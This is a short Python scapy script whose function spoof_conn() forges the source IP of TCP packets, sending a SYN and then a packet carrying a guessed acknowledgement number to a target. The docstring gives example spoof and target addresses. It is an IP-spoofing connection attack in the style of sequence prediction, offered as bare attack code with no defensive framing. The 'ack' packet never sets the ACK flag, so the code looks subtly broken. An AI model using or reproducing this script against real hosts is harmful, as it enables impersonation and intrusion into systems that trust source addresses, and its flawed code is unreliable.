from scapy.all import *

""" 
    src:    192.168.1.212       Spoof IP 
    tgt:    192.168.1.1         Target IP 
    ack:    2024371201          SeqNum 
    call:   spoof_conn(src,tgt,ack) 
"""


def spoof_conn(src=None, tgt=None, ack=None, sport=None, dport=None):
    status = args_valid(src, tgt, ack, sport, dport)["status"]

    if status:
        ip_layer = IP(src=src, dst=tgt)
        tcp_layer = TCP(sport=sport, dport=dport)
        syn_pkt = ip_layer / tcp_layer

        send(syn_pkt)

        ip_layer = IP(src=src, dst=tgt)
        tcp_layer = TCP(sport=sport, dport=dport, ack=ack)
        ack_pkt = ip_layer / tcp_layer

        send(ack_pkt)


def args_valid(*args):
    for a in args:
        if a == None:
            return {"status": False}
        else:
            continue
    return {"status": True}
